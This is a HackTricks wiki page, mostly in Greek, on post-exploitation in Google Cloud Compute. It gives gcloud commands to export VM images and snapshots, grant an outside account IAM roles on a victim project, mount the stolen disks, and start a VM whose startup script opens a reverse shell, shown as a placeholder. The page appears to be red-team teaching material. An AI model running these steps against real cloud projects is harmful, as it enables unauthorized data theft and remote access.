# GCP - Compute Post Exploitation

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Compute

Για περισσότερες πληροφορίες σχετικά με το Compute και το VPC (Networking) ελέγξτε:

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Εξαγωγή & Επιθεώρηση Εικόνων τοπικά

Αυτό θα επέτρεπε σε έναν επιτιθέμενο να **πρόσβαση στα δεδομένα που περιέχονται μέσα σε ήδη υπάρχουσες εικόνες** ή **δημιουργία νέων εικόνων από τρέχουσες VMs** και πρόσβαση στα δεδομένα τους χωρίς να έχει πρόσβαση στην τρέχουσα VM.

Είναι δυνατό να εξάγετε μια εικόνα VM σε έναν κάδο και στη συνέχεια να την κατεβάσετε και να την προσαρτήσετε τοπικά με την εντολή:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Για να εκτελέσει αυτή τη δράση ο επιτιθέμενος μπορεί να χρειαστεί προνόμια πάνω στον storage bucket και σίγουρα **προνόμια πάνω στο cloudbuild** καθώς είναι η **υπηρεσία** που θα ζητηθεί να εκτελέσει την εξαγωγή\
Επιπλέον, για να λειτουργήσει αυτό, το codebuild SA και το compute SA χρειάζονται προνομιούχες άδειες.\
Το cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` χρειάζεται:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

Και το SA `<project-id>-compute@developer.gserviceaccount.com` χρειάζεται:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Εξαγωγή & Επιθεώρηση Snapshots & Disks τοπικά

Δεν είναι δυνατόν να εξάγουμε απευθείας snapshots και disks, αλλά είναι δυνατόν να **μετατρέψουμε ένα snapshot σε disk, ένα disk σε image** και ακολουθώντας την **προηγούμενη ενότητα**, να εξάγουμε αυτό το image για να το επιθεωρήσουμε τοπικά

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Επιθεώρηση μιας Εικόνας δημιουργώντας ένα VM

Με στόχο την πρόσβαση στα **δεδομένα που αποθηκεύονται σε μια εικόνα** ή μέσα σε ένα **τρέχον VM** από όπου ένας επιτιθέμενος **έχει δημιουργήσει μια εικόνα,** είναι δυνατό να παραχωρηθεί πρόσβαση σε έναν εξωτερικό λογαριασμό πάνω στην εικόνα:
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
και στη συνέχεια δημιουργήστε ένα νέο VM από αυτό:
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
Αν δεν μπορούσατε να δώσετε πρόσβαση στον εξωτερικό σας λογαριασμό μέσω εικόνας, θα μπορούσατε να εκκινήσετε ένα VM χρησιμοποιώντας αυτήν την εικόνα στο έργο του θύματος και **να κάνετε τα metadata να εκτελέσουν ένα reverse shell** για να αποκτήσετε πρόσβαση στην εικόνα προσθέτοντας την παράμετρο:
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspect a Snapshot/Disk attaching it to a VM

Με στόχο την πρόσβαση στα **δεδομένα που είναι αποθηκευμένα σε έναν δίσκο ή ένα snapshot, θα μπορούσατε να μετατρέψετε το snapshot σε δίσκο, έναν δίσκο σε εικόνα και να ακολουθήσετε τα προηγούμενα βήματα.**

Ή θα μπορούσατε **να παραχωρήσετε πρόσβαση σε έναν εξωτερικό λογαριασμό** πάνω στον δίσκο (αν το σημείο εκκίνησης είναι ένα snapshot, δώστε πρόσβαση πάνω στο snapshot ή δημιουργήστε έναν δίσκο από αυτό):
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**Σύνδεση του δίσκου** σε μια παρουσία:
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
Mount the disk inside the VM:

1.  **SSH into the VM**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **Identify the Disk**: Once inside the VM, identify the new disk by listing the disk devices. Typically, you can find it as `/dev/sdb`, `/dev/sdc`, etc.
3. **Format and Mount the Disk** (if it's a new or raw disk):
*   Create a mount point:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   Mount the disk:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

Αν **δεν μπορείτε να δώσετε πρόσβαση σε εξωτερικό project** στο snapshot ή στο δίσκο, ίσως χρειαστεί να **εκτελέσετε αυτές τις ενέργειες μέσα σε μια instance στο ίδιο project με το snapshot/δίσκο**.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
